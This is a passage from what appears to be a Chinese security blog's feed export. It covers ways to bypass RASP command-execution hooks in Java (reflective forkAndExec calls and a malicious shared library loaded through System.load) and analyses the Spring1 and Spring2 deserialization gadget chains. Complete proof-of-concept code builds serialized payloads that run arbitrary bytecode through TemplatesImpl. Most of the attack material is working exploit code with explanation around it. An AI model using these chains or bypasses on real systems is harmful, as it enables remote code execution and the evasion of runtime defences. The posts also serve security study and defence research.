getFieldValue(processObject, <span class="string">&quot;launchMechanism&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> ((<span class="type">int</span>) launchMechanism.getClass().getMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanism)) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">byte</span>[] helperpath = getFieldValue(processObject, <span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] prog = <span class="keyword">new</span> <span class="title class_">byte</span>[cmd.getBytes().length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(cmd.getBytes(), <span class="number">0</span>, prog, <span class="number">0</span>, cmd.getBytes().length);</span><br><span class="line">        <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">argc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[] envBlock = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">envc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[] dir = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span>[] fds = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">redirectErrorStream</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Method method : processClass.getDeclaredMethods()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (method.getName().endsWith(<span class="string">&quot;forkAndExec&quot;</span>) &amp;&amp; !method.getName().equals(<span class="string">&quot;forkAndExec&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;修改后的方法名为：&quot;</span>+method.getName()+<span class="string">&quot;, 绕过成功！&quot;</span>);</span><br><span class="line">                method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                method.invoke(processObject, ordinal, helperpath, prog, argBlock, argc,</span><br><span class="line">                        envBlock, envc, dir, fds, redirectErrorStream);</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flag)&#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">forkAndExecMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="type">int</span>.class, <span class="type">byte</span>[].class,</span><br><span class="line">                    <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class);</span><br><span class="line">            forkAndExecMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            forkAndExecMethod.invoke(processObject, ordinal, helperpath, prog, argBlock, argc,</span><br><span class="line">                    envBlock, envc, dir, fds, redirectErrorStream);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">unsafe_getObject</span><span class="params">(Class&lt;? <span class="built_in">super</span> T&gt; objectClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) ((Unsafe) unsafeField.get(<span class="literal">null</span>)).allocateInstance(objectClass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> (T) field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> (field != <span class="literal">null</span>)</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!clazz.getSuperclass().equals(Object.class)) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240324145220175.png"
                      alt="image-20240324145220175"
                ></p>
<p>可以发现命令被成功执行，而且执行的命令并没有被拦截。</p>
<h2 id="JNI-绕过RASP-执行命令"><a href="#JNI-绕过RASP-执行命令" class="headerlink" title="JNI 绕过RASP 执行命令"></a>JNI 绕过RASP 执行命令</h2><p><a class="link"   href="https://www.cnblogs.com/nice0e3/p/14067160.html#0x02-jni%E5%AE%9E%E7%8E%B0" >https://www.cnblogs.com/nice0e3/p/14067160.html#0x02-jni%E5%AE%9E%E7%8E%B0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这种方式挺麻烦的，这个装载native方法的类从哪儿上传呢，可能可以写个静态代码块先 loadLibrary ？有空再学吧</p>
<h2 id="System-load-绕过"><a href="#System-load-绕过" class="headerlink" title="System.load 绕过"></a>System.load 绕过</h2><p>大概就是编译一个c文件为 so（Linux） 或者 dll （Windows）</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="type">void</span> <span class="title">preload</span> <span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc -shared -fPIC evil.c -o evil.so</span></span><br><span class="line"><span class="comment">// gcc -shared -fPIC evil.c -o evil.dll</span></span><br></pre></td></tr></table></figure></div>

<p>使用 gcc 进行编译 </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC evil.c -o evil.dll</span><br><span class="line">或</span><br><span class="line">gcc -shared -fPIC evil.c -o evil.so</span><br></pre></td></tr></table></figure></div>

<p>最后通过 Evil 类去调用 System.load() 方法进行加载即可。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring 反序列化</title>
    <url>/2022/03/05/blog_java%20spring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
    <content><![CDATA[<h2 id="Spring1反序列化"><a href="#Spring1反序列化" class="headerlink" title="Spring1反序列化"></a>Spring1反序列化</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h4 id="MethodInvokeTypeProvider"><a href="#MethodInvokeTypeProvider" class="headerlink" title="MethodInvokeTypeProvider"></a>MethodInvokeTypeProvider</h4><p>在 Spring 核心包中存在这样一个内部类：<code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code>，这个类实现了 TypeProvider 接口，是一个可以被反序列化的类。</p>
<p>readObject代码如下，调用了ReflectionUtils.findMethod获取Method对象，调用invokeMethod执行方法。无参调用，如果可以调用到TemplatesImpl.newTransformer即可完成反序列化链了。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    inputStream.defaultReadObject();</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionUtils.findMethod(<span class="built_in">this</span>.provider.getType().getClass(), <span class="built_in">this</span>.methodName);</span><br><span class="line">    <span class="built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="built_in">this</span>.provider.getType());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>假如我们的 this.provider.getType() 和 methodName 可控，这里就可以将 getType 写成是templateImpl的类，methodName要是能处理为 newTransformer 的话，这里就可以执行任意代码了。</p>
<h4 id="ObjectFactoryDelegatingInvocationHandler"><a href="#ObjectFactoryDelegatingInvocationHandler" class="headerlink" title="ObjectFactoryDelegatingInvocationHandler"></a>ObjectFactoryDelegatingInvocationHandler</h4><p><code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code> 是 InvocationHandler 的实现类，实例化时接收一个 ObjectFactory 对象，并在 invoke 代理时调用 ObjectFactory 的 getObject 方法返回 ObjectFactory 的实例用于 Method 的反射调用。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/UU%25%7D%7D5AHI599(@(%25ZV)0HJ.png"
                      alt="img"
                ></p>
<p>当我触发代理的方法不为 equals、hashCode、toString时，就能对getObject返回的对象触发代理方法。</p>
<p>ObjectFactory 的 getObject 方法返回的对象是泛型的，那就可以可用 AnnotationInvocationHandler 来代理，返回任意对象。</p>
<p>而 ObjectFactoryDelegatingInvocationHandler 自己本身就是代理类，可以用它代理之前的 TypeProvider 的 getType 方法。</p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.ObjectFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Spring1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Spring1.bin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> Reflections.generateTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用 AnnotationInvocationHandler 动态代理</span></span><br><span class="line">        Class&lt;?&gt;       c           = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;getObject&quot;</span>, tmpl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用动态代理初始化 AnnotationInvocationHandler</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);</span><br><span class="line">        <span class="comment">// 使用 AnnotationInvocationHandler 动态代理 ObjectFactory 的 getObject 方法，使其返回 TemplatesImpl</span></span><br><span class="line">        ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(</span><br><span class="line">                ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ObjectFactory.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ObjectFactoryDelegatingInvocationHandler 的 invoke 方法触发 ObjectFactory 的 getObject</span></span><br><span class="line">        <span class="comment">// 并且会调用 method.invoke(返回值,args)</span></span><br><span class="line">        <span class="comment">// 此时返回值被我们使用动态代理改为了 TemplatesImpl</span></span><br><span class="line">        <span class="comment">// 接下来需要 method 是 newTransformer()，就可以触发调用链了</span></span><br><span class="line">        Class&lt;?&gt;       clazz          = Class.forName(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ofdConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">ofdHandler</span> <span class="operator">=</span> (InvocationHandler) ofdConstructor.newInstance(factory);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler</span></span><br><span class="line">        <span class="comment">// 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法</span></span><br><span class="line">        <span class="comment">// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类</span></span><br><span class="line">        <span class="comment">// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法</span></span><br><span class="line">        <span class="type">Type</span> <span class="variable">typeTemplateProxy</span> <span class="operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类</span></span><br><span class="line">        HashMap&lt;String, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(<span class="string">&quot;getType&quot;</span>, typeTemplateProxy);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">newInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);</span><br><span class="line">        <span class="comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">typeProviderProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化 MethodInvokeTypeProvider</span></span><br><span class="line">        Class&lt;?&gt;       clazz2 = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())</span></span><br><span class="line">        <span class="comment">// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">objects</span> <span class="operator">=</span> cons.newInstance(typeProviderProxy, Object.class.getMethod(<span class="string">&quot;toString&quot;</span>), <span class="number">0</span>);</span><br><span class="line">        <span class="type">Field</span>  <span class="variable">field</span>   <span class="operator">=</span> clazz2.getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(objects, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SerializerUtil.objectFileSerialize(objects,fileName);</span><br><span class="line">        SerializerUtil.objectFileDeserialize(fileName);</span><br><span class="line"><span class="comment">//        SerializeUtil.writeObjectToFile(objects, fileName);</span></span><br><span class="line"><span class="comment">//        SerializeUtil.readFileObject(fileName);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<h2 id="Spring2反序列化-–-Java版本有限制"><a href="#Spring2反序列化-–-Java版本有限制" class="headerlink" title="Spring2反序列化 – Java版本有限制"></a>Spring2反序列化 – Java版本有限制</h2><p>Spring2 在 Spring1 的触发链上有所变换，替换了 spring-beans 的 ObjectFactoryDelegatingInvocationHandler，使用了 spring-aop 的 JdkDynamicAopProxy ，并完成了后续触发 TemplatesImpl 的流程。</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="JdkDynamicAopProxy"><a href="#JdkDynamicAopProxy" class="headerlink" title="JdkDynamicAopProxy"></a>JdkDynamicAopProxy</h4><p><code>org.springframework.aop.framework.JdkDynamicAopProxy</code> 类是 Spring AOP 框架基于 JDK 动态代理的实现，同时其还实现了 AopProxy 接口。</p>
<p>我们来看一下 invoke 方法，获取 AdvisedSupport 里的 TargetSource，并调用 <code>getTarget()</code> 方法返回其中的对象。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1627522830580.png"
                      alt="img"
                ></p>
<p>调用 <code>AopUtils#invokeJoinpointUsingReflection()</code> 方法反射调用对象的 method 方法并返回。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1627522834769.png"
                      alt="img"
                ></p>
<p>方法里就是简单的反射调用。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1627522838105.png"
                      alt="img"
                ></p>
<p>由此我们可以看到 JdkDynamicAopProxy 这个 InvocationHandler 类可以出色的完成 TemplatesImpl 的对象调用，可以直接配合 Spring1 中的触发调用链。</p>
<h3 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h3><p>与 Spring1 类似，直接上代码：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Spring2</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Spring2.bin&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span></span><br><span class="line">		<span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> SerializeUtil.generateTemplatesImpl();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 实例化 AdvisedSupport</span></span><br><span class="line">		<span class="type">AdvisedSupport</span> <span class="variable">as</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">		as.setTarget(tmpl);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 使用 AnnotationInvocationHandler 动态代理</span></span><br><span class="line">		Class&lt;?&gt;       c           = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">		Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">		constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// JdkDynamicAopProxy 的 invoke 方法触发 TargetSource 的 getTarget 返回 tmpl</span></span><br><span class="line">		<span class="comment">// 并且会调用 method.invoke(返回值,args)</span></span><br><span class="line">		<span class="comment">// 此时返回值被我们使用动态代理改为了 TemplatesImpl</span></span><br><span class="line">		<span class="comment">// 接下来需要 method 是 newTransformer()，就可以触发调用链了</span></span><br><span class="line">		Class&lt;?&gt;       clazz          = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">		Constructor&lt;?&gt; aopConstructor = clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">		aopConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		<span class="comment">// 使用 AdvisedSupport 实例化 JdkDynamicAopProxy</span></span><br><span class="line">		<span class="type">InvocationHandler</span> <span class="variable">aopProxy</span> <span class="operator">=</span> (InvocationHandler) aopConstructor.newInstance(as);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// JdkDynamicAopProxy 本身就是个 InvocationHandler</span></span><br><span class="line">		<span class="comment">// 使用它来代理一个类，这样在这个类调用时将会触发 JdkDynamicAopProxy 的 invoke 方法</span></span><br><span class="line">		<span class="comment">// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类</span></span><br><span class="line">		<span class="comment">// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法</span></span><br><span class="line">		<span class="type">Type</span> <span class="variable">typeTemplateProxy</span> <span class="operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, aopProxy);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类</span></span><br><span class="line">		HashMap&lt;String, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">		map2.put(<span class="string">&quot;getType&quot;</span>, typeTemplateProxy);</span><br><span class="line"></span><br><span class="line">		<span class="type">InvocationHandler</span> <span class="variable">newInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);</span><br><span class="line"></span><br><span class="line">		Class&lt;?&gt; typeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);</span><br><span class="line">		<span class="comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span></span><br><span class="line">		<span class="type">Object</span> <span class="variable">typeProviderProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 初始化 MethodInvokeTypeProvider</span></span><br><span class="line">		Class&lt;?&gt;       clazz2 = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">		Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">		cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		<span class="comment">// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())</span></span><br><span class="line">		<span class="comment">// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去</span></span><br><span class="line">		<span class="type">Object</span> <span class="variable">objects</span> <span class="operator">=</span> cons.newInstance(typeProviderProxy, Object.class.getMethod(<span class="string">&quot;toString&quot;</span>), <span class="number">0</span>);</span><br><span class="line">		<span class="type">Field</span>  <span class="variable">field</span>   <span class="operator">=</span> clazz2.getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">		field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">		field.set(objects, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">		SerializeUtil.writeObjectToFile(objects, fileName);</span><br><span class="line">		SerializeUtil.readFileObject(fileName);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上就是 Spring2 链分析的全部内容了，如果理解了 Spring1，那看 Spring2 就很简单了，最后总结一下。</p>
<ol>
<li>利用说明：<ul>
<li>使用 JdkDynamicAopProxy 替换 ObjectFactoryDelegatingInvocationHandler，并完成最终的调用链。</li>
</ul>
</li>
<li>Gadget 总结：<ul>
<li>kick-off gadget：<code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider#readObject()</code></li>
<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()</code></li>
<li>chain gadget：<code>org.springframework.aop.framework.JdkDynamicAopProxy#invoke()</code></li>
</ul>
</li>
<li>调用链展示：</li>
</ol>
